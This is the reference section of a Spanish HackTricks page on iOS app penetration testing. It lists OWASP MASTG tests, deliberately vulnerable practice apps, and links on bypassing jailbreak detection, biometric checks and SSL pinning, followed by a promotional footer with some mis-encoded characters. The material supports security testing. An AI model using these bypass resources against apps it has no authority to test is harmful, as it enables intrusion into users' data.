* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06b-basic-security-testing#information-gathering)
* [iOS & Mobile App Pentesting - INE](https://my.ine.com/CyberSecurity/courses/089d060b/ios-mobile-app-pentesting)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0057/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0058/)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0059/)
* [https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage](https://mas.owasp.org/MASTG/iOS/0x06d-Testing-Data-Storage)
* [https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way](https://coderwall.com/p/kjb3lw/storing-password-in-keychain-the-smart-way)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0055/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0053)
* [https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/](https://mas.owasp.org/MASTG/techniques/ios/MASTG-TECH-0060/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0058)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0060)
* [https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/](https://mas.owasp.org/MASTG/Android/0x05f-Testing-Local-Authentication/)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064](https://mas.owasp.org/MASTG/tests/ios/MASVS-AUTH/MASTG-TEST-0064)
* [https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc](https://medium.com/securing/bypassing-your-apps-biometric-checks-on-ios-c2555c81a2dc)
* [https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054](https://mas.owasp.org/MASTG/tests/ios/MASVS-STORAGE/MASTG-TEST-0054)
* [https://github.com/ivRodriguezCA/RE-iOS-Apps/](https://github.com/ivRodriguezCA/RE-iOS-Apps/) Curso gratuito de iOS ([https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/](https://syrion.me/blog/ios-swift-antijailbreak-bypass-frida/))
* [https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577](https://www.sans.org/reading-room/whitepapers/testing/ipwn-apps-pentesting-ios-applications-34577)
* [https://www.slideshare.net/RyanISI/ios-appsecurityminicourse](https://www.slideshare.net/RyanISI/ios-appsecurityminicourse)
* [https://github.com/prateek147/DVIA](https://github.com/prateek147/DVIA)
* [https://github.com/prateek147/DVIA-v2](https://github.com/prateek147/DVIA-v2)
* [https://github.com/OWASP/MSTG-Hacking-Playground%20](https://github.com/OWASP/MSTG-Hacking-Playground)
* OWASP iGoat [_https://github.com/OWASP/igoat_](https://github.com/OWASP/igoat) <<< Versi贸n Objective-C [_https://github.com/OWASP/iGoat-Swift_](https://github.com/OWASP/iGoat-Swift) <<< Versi贸n Swift
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)
* [https://github.com/nabla-c0d3/ssl-kill-switch2](https://github.com/nabla-c0d3/ssl-kill-switch2)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Utiliza [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir y **automatizar flujos de trabajo** f谩cilmente con las herramientas comunitarias m谩s avanzadas del mundo.\
隆Accede hoy mismo:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
